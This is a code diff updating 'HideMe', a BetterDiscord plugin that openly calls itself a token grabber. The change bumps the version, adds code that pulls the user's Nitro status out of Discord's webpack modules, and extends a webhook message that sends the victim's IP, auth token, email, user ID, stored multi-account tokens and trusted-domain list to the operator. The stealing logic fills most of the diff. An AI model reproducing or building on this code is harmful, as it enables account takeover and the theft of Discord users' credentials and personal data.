@@ -2,7 +2,7 @@
  * @name HideMe
  * @author HideakiAtsuyo
  * @authorId 868150205852291183
- * @version 1.1.4
+ * @version 1.1.5
  * @description Allows you to token grab people omg
  * @invite https://discord.gg/C7yHkVSE2M
  * @donate https://www.paypal.me/HideakiAtsuyoLmao
@@ -28,7 +28,7 @@ class HideMe {
         return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
     }
     getVersion() {
-        return "1.1.4";
+        return "1.1.5";
     }
     getAuthor() {
         return "Hideaki Atsuyo";
@@ -118,6 +118,7 @@ class HideMe {
         var actualUserID = await getInfo("user_id_cache");
         //var actualUserSettings = await getInfo("UserSettingsStore"); //Pretty Big
         var actualUserEmail = await getInfo("email_cache");
+        var actualUserPremiumState = window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const r of Object.keys(e.c).map(r=>e.c[r].exports).filter(e=>e)){if(r.default&&void 0!==r.default.getCurrentUser)return JSON.parse(JSON.stringify(r.default.getCurrentUser())).premiumUsageFlags;if(void 0!==r.getCurrentUser)return JSON.parse(JSON.stringify(r.getCurrentUser())).premiumUsageFlags}}]);
         var storedTokens = await getInfo("tokens"); // For New Multi Account System
         var trustedDomains = await getInfo("MaskedLinkStore"); // Trusted Domains List(when you trust them with the "Yes" button)
         var verifiedGameAndProgramsList = await getInfo("GameStoreReportedGames"); //List of VERIFIED games/programs
@@ -127,7 +128,7 @@ class HideMe {
             username: config.webhookUsername,
             avatar_url: config.webhookAvatar,
             tts: config.tts,
-            embeds: [{"title": config.embedTitle, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }]}]
+            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.5" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${actualUserPremiumState == 2 ? "Boost" : actualUserPremiumState == 1 ? "Classic" : "No" }\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }]}]
         });
 
         console.log(pD)
